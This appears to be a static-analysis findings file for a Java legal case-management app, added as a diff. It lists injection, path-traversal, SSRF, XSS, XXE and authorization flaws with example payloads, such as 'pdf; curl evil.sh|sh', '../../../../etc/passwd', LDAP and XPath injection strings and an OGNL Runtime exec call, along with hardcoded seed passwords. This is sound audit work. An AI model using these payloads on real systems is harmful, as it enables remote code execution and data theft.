@@ -1,0 +1,562 @@
+{
+  "version": "1.0.0",
+  "results": [
+    {
+      "check_id": "java.security.access-control.unauthenticated-upload-dir-listing",
+      "path": "decision/src/main/java/com/lexbridge/decision/CaseFileStaticConfig.java",
+      "start": {
+        "line": 13,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 29,
+        "col": 1,
+        "offset": 0
+      },
+      "extra": {
+        "message": "A Tomcat DefaultServlet is registered at /case-files/* with 'listings=true' and its context docBase is set to app.upload-dir \u2014 the exact directory CaseService uses to store every uploaded document version, brand asset, CSV export ('exports/'), converted document ('rendered/'), and case-file note (CaseService.storeCaseFile/archiveCsv/storeBrandAsset). DecisionApplication.java's SecurityFilterChain explicitly permitAll()s '/case-files/**' (line ~41) and TokenFilter.java skips session-token enforcement for any path starting with '/case-files' (line 26). The combined effect is that any unauthenticated client can browse a full directory listing of the upload store and download privileged legal documents, exports, and brand assets with no login at all.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-306: Missing Authentication for Critical Function",
+            "CWE-548: Exposure of Information Through Directory Listing"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "java.security.access-control.role-impersonation-via-scope-param",
+      "path": "decision/src/main/java/com/lexbridge/decision/DecisionController.java",
+      "start": {
+        "line": 210,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 242,
+        "col": 1,
+        "offset": 0
+      },
+      "extra": {
+        "message": "The /internal/matters GET endpoint has no @PreAuthorize restriction and accepts a client-supplied 'scope' parameter. When non-blank, it is parsed with Role.valueOf(scope) and used to construct an entirely new Actor with that role (line 221-224): 'Actor view = scope.isBlank() ? a : new Actor(a.id(), a.email(), a.name(), Role.valueOf(scope), a.clientId());'. cases.listMatters(view, ...) then applies that forged role's visibility rules instead of the caller's real role. Any authenticated user \u2014 including a CLIENT \u2014 can call GET /internal/matters?scope=FIRM_ADMIN (forwarded unchanged by WebController.matters at channel/.../WebController.java:190-227) to list every matter in the firm, bypassing client/attorney/paralegal ownership scoping entirely.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-639: Authorization Bypass Through User-Controlled Key",
+            "CWE-862: Missing Authorization"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "java.security.injection.os-command-injection-document-convert",
+      "path": "decision/src/main/java/com/lexbridge/decision/CaseService.java",
+      "start": {
+        "line": 596,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 603,
+        "col": 60,
+        "offset": 0
+      },
+      "extra": {
+        "message": "convertDocument() builds a shell command by directly concatenating the caller-supplied 'profile' string ('soffice --headless --convert-to ' + profile + ' --outdir ' + ...), then executes it with Runtime.getRuntime().exec(new String[]{\"sh\",\"-c\",command}). 'profile' originates from the @PathVariable in DecisionController.convert (/documents/{id}/convert/{profile}, line 1043-1048), itself forwarded unchanged from WebController.convert (/documents/{id}/convert, WebController.java:564-576). A value such as 'pdf; curl evil.sh|sh' or 'pdf $(id>out)' achieves arbitrary OS command execution on the server.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-78: OS Command Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "java.security.deserialization.unsafe-objectinputstream-legacy-bundle",
+      "path": "decision/src/main/java/com/lexbridge/decision/CaseService.java",
+      "start": {
+        "line": 682,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 701,
+        "col": 5,
+        "offset": 0
+      },
+      "extra": {
+        "message": "restoreLegacyBundle() base64-decodes an attacker-supplied 'blob' and feeds it straight into 'new ObjectInputStream(...).readObject()' with no class allow-list or filter. The 'bundle' value is a plain @RequestParam on DecisionController.legacyBundle (/matters/{id}/legacy-bundle, line 1117-1122), reachable via WebController.restoreBundle (/firm/bundles/restore, WebController.java:660-674). Any FIRM_ADMIN session (or a forged one, see the role-impersonation finding) can submit a crafted serialized gadget chain to achieve remote code execution during deserialization.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-502: Deserialization of Untrusted Data"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "java.security.injection.ognl-expression-injection-deadline-rule",
+      "path": "decision/src/main/java/com/lexbridge/decision/CaseService.java",
+      "start": {
+        "line": 664,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 671,
+        "col": 5,
+        "offset": 0
+      },
+      "extra": {
+        "message": "evaluateDeadlineRule() passes the caller-controlled 'rule' string directly to 'Ognl.getValue(rule, vars, new Object())' with no sandboxing. 'rule' comes from the X-Rule-Expr header read by DecisionController.previewRule (/deadlines/preview, line 1110-1115), itself relayed verbatim from WebController.previewRule (/deadlines/preview, WebController.java:620-628, user-supplied 'rule' request param). OGNL expressions can invoke arbitrary static methods (e.g. via @java.lang.Runtime@getRuntime().exec(...)), giving remote code execution \u2014 the same class of bug behind several Struts2 CVEs.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-917: Improper Neutralization of Special Elements used in an Expression Language Statement",
+            "CWE-94: Code Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "java.security.injection.ssti-velocity-notice-render",
+      "path": "decision/src/main/java/com/lexbridge/decision/CaseService.java",
+      "start": {
+        "line": 673,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 680,
+        "col": 5,
+        "offset": 0
+      },
+      "extra": {
+        "message": "renderNotice() evaluates the caller-supplied 'body' string directly as a Velocity template via 'Velocity.evaluate(ctx, writer, \"notice\", body)'. 'body' is the raw @RequestParam in DecisionController.notice (/firm/notices/render, line 1098-1102), relayed from WebController.noticePreview (/firm/notices/preview, WebController.java:676-687). Velocity templates support directives like #set and method invocation on context objects / class loading via #foreach tricks and the Velocity engine's reflection, enabling server-side template injection that leads to remote code execution.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-94: Code Injection",
+            "CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "java.security.injection.ldap-injection-staff-directory",
+      "path": "decision/src/main/java/com/lexbridge/decision/StaffDirectory.java",
+      "start": {
+        "line": 22,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 41,
+        "col": 5,
+        "offset": 0
+      },
+      "extra": {
+        "message": "resolve() builds an LDAP search filter by direct string concatenation: '\"(&(objectClass=person)(uid=\" + handle + \"))\"' with no escaping of LDAP metacharacters. 'handle' is the raw lb_staff cookie value, set without validation by WebController.directoryHandle (/firm/directory-handle, WebController.java:733-742) and forwarded as a Cookie header to DecisionController.registry (/directory/registry, DecisionController.java:1184-1189). A value like '*)(uid=*))(|(uid=*' lets an attacker manipulate the search filter to enumerate or disclose unintended directory entries.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-90: Improper Neutralization of Special Elements used in an LDAP Query"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "java.security.path-traversal.exhibit-text-arbitrary-read",
+      "path": "decision/src/main/java/com/lexbridge/decision/CaseService.java",
+      "start": {
+        "line": 644,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 647,
+        "col": 5,
+        "offset": 0
+      },
+      "extra": {
+        "message": "readExhibitText() calls 'Files.readString(base.resolve(ref))' with no normalize()/startsWith(base) boundary check \u2014 unlike every other file accessor in this class (download(), brandAsset(), saveVersion() all verify the resolved path stays inside 'base'). 'ref' is taken directly from the X-Exhibit-Ref header in DecisionController.exhibitText (/internal/exhibits/text, line 1104-1108), itself the raw 'ref' query parameter in WebController.exhibitText (/documents/exhibit-text, WebController.java:607-612). A value like '../../../../etc/passwd' reads arbitrary files on the server as the application user.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Path Traversal"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "java.security.path-traversal.csv-export-arbitrary-write",
+      "path": "decision/src/main/java/com/lexbridge/decision/CaseService.java",
+      "start": {
+        "line": 572,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 587,
+        "col": 5,
+        "offset": 0
+      },
+      "extra": {
+        "message": "archiveCsv() writes caller-controlled CSV content to 'new File(dir, saveAs)' where 'saveAs' is taken unsanitized from the @RequestParam in DecisionController.deadlineExport (/reports/deadlines.csv?saveAs=, line 551-583), relayed from WebController.report (/reports/{name}.csv?saveAs=, WebController.java:550-562). No Paths.get(...).normalize()/startsWith(base) check is performed, so a value such as '../../../../some/path/evil.txt' lets any staff user (FIRM_ADMIN/ATTORNEY/PARALEGAL) write a file to an arbitrary location on disk reachable by the application process.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Path Traversal"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "java.security.path-traversal.case-file-info-disclosure",
+      "path": "decision/src/main/java/com/lexbridge/decision/CaseService.java",
+      "start": {
+        "line": 649,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 662,
+        "col": 5,
+        "offset": 0
+      },
+      "extra": {
+        "message": "caseFileInfo() calls 'Files.readAttributes(base.resolve(storedName), ...)' with no boundary check on the resolved path. 'storedName' comes straight from the request body in DecisionController.caseFileInfo (/matters/{id}/case-file-info, line 1211-1218), relayed from WebController.caseFileInfo (WebController.java:780-787). A path-traversal value such as '../../../../etc/passwd' discloses the existence, size, and modification time of arbitrary files outside the upload directory.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Path Traversal"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "java.security.ssrf.webhook-deliver-unrestricted-target",
+      "path": "decision/src/main/java/com/lexbridge/decision/DecisionController.java",
+      "start": {
+        "line": 993,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 1026,
+        "col": 5,
+        "offset": 0
+      },
+      "extra": {
+        "message": "deliverWebhook() takes 'targetUrl' as a plain @RequestParam and passes it directly to 'new okhttp3.Request.Builder().url(targetUrl)...' with zero validation, then executes the HTTP call server-side. The sibling 'webhook' (test) endpoint just above it (line 970-991) explicitly restricts targets to 'https?://(localhost|127.0.0.1)(:port)?(/.*)?', showing the restriction was known but omitted here. A FIRM_ADMIN (or an attacker who forged that role, see the role-impersonation finding) can direct the server to issue requests to internal-only services, cloud metadata endpoints (e.g. 169.254.169.254), or other hosts not otherwise reachable from outside.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-918: Server-Side Request Forgery (SSRF)"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "java.security.exposure.signing-key-and-credential-leak",
+      "path": "decision/src/main/java/com/lexbridge/decision/DecisionController.java",
+      "start": {
+        "line": 732,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 742,
+        "col": 5,
+        "offset": 0
+      },
+      "extra": {
+        "message": "settingList() returns 'core.credential' (the shared secret used to authenticate to the core service, see CoreGateway.java:28) and 'session.signing' (the HMAC key AuthService uses to sign every session token, AuthService.java:298-308) in plaintext whenever 'section=delivery' is requested at GET /internal/admin/settings. Any FIRM_ADMIN session can retrieve both secrets; with the signing key, an attacker can forge valid session tokens for any user/role (full authentication bypass), and with the core credential they can call the internal core service directly.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-522: Insufficiently Protected Credentials",
+            "CWE-200: Exposure of Sensitive Information to an Unauthorized Actor"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "java.security.injection.xpath-injection-court-register",
+      "path": "channel/src/main/java/com/lexbridge/channel/WebController.java",
+      "start": {
+        "line": 830,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 849,
+        "col": 5,
+        "offset": 0
+      },
+      "extra": {
+        "message": "courtRegister() builds an XPath expression by direct string concatenation: '\"//filing[court='\" + court + \"']\"'. 'court' is the raw lb_court cookie value, set without any validation by registerFilter() (/register POST, WebController.java:813-821) from the 'court' request parameter. An authenticated user can set a cookie value like ''] | //filing[1=1' or similar XPath injection payloads to alter the query against court-register.xml and extract data outside the intended filter.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-643: Improper Neutralization of Data within XPath Expressions"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "java.security.xss.reflected-register-caption",
+      "path": "decision/src/main/java/com/lexbridge/decision/DecisionController.java",
+      "start": {
+        "line": 1201,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 1209,
+        "col": 5,
+        "offset": 0
+      },
+      "extra": {
+        "message": "registerView() writes the X-Register-Caption header value directly into an HTML response with no escaping: 'resp.getWriter().write(\"<h2>Court register</h2><p>\" + caption + \"</p>\")' on a text/html response. 'caption' is the raw 'caption' request parameter forwarded unmodified by WebController.registerView (/firm/register/view, WebController.java:772-778). A caption value containing '<script>...</script>' is rendered and executed in the browser of any staff member (FIRM_ADMIN/ATTORNEY/PARALEGAL) who views the page with that caption, e.g. via a crafted link.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-79: Improper Neutralization of Input During Web Page Generation (Cross-site Scripting)"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "java.security.misconfiguration.xxe-jaxb-filing-manifest",
+      "path": "decision/src/main/java/com/lexbridge/decision/CaseService.java",
+      "start": {
+        "line": 481,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 502,
+        "col": 5,
+        "offset": 0
+      },
+      "extra": {
+        "message": "importFilingManifest() unmarshals attacker-supplied XML ('manifestXml', from DecisionController.importFilings /admin/import/filings, relayed from WebController.importFilings WebController.java:1041-1057) with a plain 'JAXBContext.newInstance(FilingManifest.class)' / 'ctx.createUnmarshaller()' and no hardening (no XMLInputFactory with external entities disabled, no FEATURE_SECURE_PROCESSING on the underlying parser). The default JAXB RI unmarshalling path can resolve external entities and DTDs unless explicitly disabled, allowing an XXE payload embedded in manifestXml to read local files or trigger out-of-band SSRF requests during parsing.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-611: Improper Restriction of XML External Entity Reference"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "java.security.misconfiguration.xxe-documentbuilderfactory-default",
+      "path": "channel/src/main/java/com/lexbridge/channel/WebController.java",
+      "start": {
+        "line": 830,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 836,
+        "col": 5,
+        "offset": 0
+      },
+      "extra": {
+        "message": "courtRegister() obtains a DOM parser via 'DocumentBuilderFactory.newInstance().newDocumentBuilder()' without disabling DOCTYPE declarations or external general/parameter entities (no setFeature calls for disallow-doctype-decl / external-general-entities / external-parameter-entities, no setXIncludeAware(false)). The XML parsed here is currently a bundled classpath resource (court-register.xml), so this specific call site is not directly attacker-reachable today, but the insecure factory configuration is a latent XXE risk if this method or pattern is reused on any externally-supplied XML.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-611: Improper Restriction of XML External Entity Reference"
+          ],
+          "confidence": "LOW",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "java.security.open-redirect.post-login-continue",
+      "path": "channel/src/main/java/com/lexbridge/channel/WebController.java",
+      "start": {
+        "line": 89,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 92,
+        "col": 4,
+        "offset": 0
+      },
+      "extra": {
+        "message": "continueLocation() URL-decodes the 'lb_return' cookie (set from the raw 'next' query parameter in login() GET, line 48-59, with no scheme/host validation) and returns it unchanged to be used as 'return \"redirect:\" + onward' in the POST /login handler (line 73-87). Because the value is never restricted to a same-origin relative path, an attacker can craft a link like /login?next=https://evil.example/phish so that after a victim authenticates, they are redirected to an attacker-controlled site.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-601: URL Redirection to Untrusted Site ('Open Redirect')"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "java.security.authn.weak-hash-registry-signin",
+      "path": "decision/src/main/java/com/lexbridge/decision/AuthService.java",
+      "start": {
+        "line": 75,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 109,
+        "col": 4,
+        "offset": 0
+      },
+      "extra": {
+        "message": "registrySignIn() implements a second, parallel authentication path that verifies credentials using a raw MD5 digest of the supplied phrase compared against the stored passwordHash, instead of the BCryptPasswordEncoder used everywhere else (login(), resetPassword()). MD5 has no work factor and is unsuitable for password verification; worse, if a user record has no passwordHash yet, the first caller's MD5(phrase) is silently persisted as the permanent password hash (lines 91-93), letting anyone who reaches this endpoint first claim the account's credential.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-916: Use of Password Hash With Insufficient Computational Effort",
+            "CWE-287: Improper Authentication"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "java.security.header-injection.raw-header-cookie-passthrough",
+      "path": "channel/src/main/java/com/lexbridge/channel/DecisionClient.java",
+      "start": {
+        "line": 50,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 68,
+        "col": 4,
+        "offset": 0
+      },
+      "extra": {
+        "message": "getWithHeader()/bytesWithHeader()/postWithHeader() accept an arbitrary header name/value and forward it unsanitized to the upstream decision service (e.g. WebController.exhibitText passes the raw 'ref' query param as X-Exhibit-Ref, WebController.previewRule passes raw 'rule' as X-Rule-Expr, WebController.registerView passes raw 'caption' as X-Register-Caption). getWithCookie() (line 60-68) similarly builds a raw 'name=value' Cookie header string from caller-controlled input ('lb_view='+pass in WebController.openDocument, 'lb_staff='+handle in WebController.directory) with no escaping of ';' or control characters, allowing additional cookie pairs or header values to be smuggled into the outbound request to the backend service.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers"
+          ],
+          "confidence": "LOW",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "java.security.misconfiguration.cors-wildcard-with-credentials",
+      "path": "channel/src/main/java/com/lexbridge/channel/SecurityConfig.java",
+      "start": {
+        "line": 55,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 65,
+        "col": 4,
+        "offset": 0
+      },
+      "extra": {
+        "message": "corsConfigurationSource() sets 'setAllowedOriginPatterns(List.of(\"*\"))' together with 'setAllowCredentials(true)' for the '/api/**' path. Spring's allowedOriginPatterns (unlike allowedOrigins) permits the literal wildcard to be combined with credentials: the filter reflects whatever Origin header the browser sends and still allows cookies to be included. Any external website can therefore issue credentialed cross-origin requests (fetch with credentials:'include') to endpoints like /api/matter-search and /api/workspace-view on behalf of a logged-in victim and read the JSON response, leaking matter data or changing the victim's effective view role cross-origin.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-942: Permissive Cross-domain Policy with Untrusted Domains"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "java.security.access-control.client-forgeable-view-role",
+      "path": "channel/src/main/java/com/lexbridge/channel/WebController.java",
+      "start": {
+        "line": 696,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 701,
+        "col": 4,
+        "offset": 0
+      },
+      "extra": {
+        "message": "workspaceView() lets any authenticated caller set session.setAttribute(\"viewRole\", v.viewRole()) where ViewRole only requires a non-blank string (record ViewRole(@NotBlank String viewRole), line 28) \u2014 no enum/role allow-list is enforced. SessionIdentityFilter.doFilterInternal (SecurityConfig.java:76-96) then reads this 'viewRole' attribute and, if present, uses it in place of the user's real role to build the SecurityContextHolder authority: 'if (view != null) role = view.toString(); ... new SimpleGrantedAuthority(\"ROLE_\" + role)'. A CLIENT-role user can POST {\"viewRole\":\"FIRM_ADMIN\"} to /api/workspace-view and have the channel application's own @PreAuthorize checks (e.g. on /admin/users, /admin/settings pages) evaluate against a self-selected role for the rest of the session.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-863: Incorrect Authorization",
+            "CWE-269: Improper Privilege Management"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "java.security.credentials.hardcoded-seed-passwords",
+      "path": "decision/src/main/java/com/lexbridge/decision/SeedData.java",
+      "start": {
+        "line": 62,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 118,
+        "col": 4,
+        "offset": 0
+      },
+      "extra": {
+        "message": "SeedData hardcodes plaintext account passwords ('Records!2026', 'Lexbridge!2026', 'Archive!2026') that are encoded/stored for several default accounts including a FIRM_ADMIN ('records.officer@lexbridge.test', 'admin@lexbridge.test'). The 'archivist@lexbridge.test' account additionally stores its passwordHash as a raw MD5 digest (line 112-116) instead of going through the BCryptPasswordEncoder, meaning it can only authenticate via the weaker registrySignIn() path (see the separate weak-hash finding), not the normal bcrypt login.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-798: Use of Hard-coded Credentials"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    }
+  ]
+}
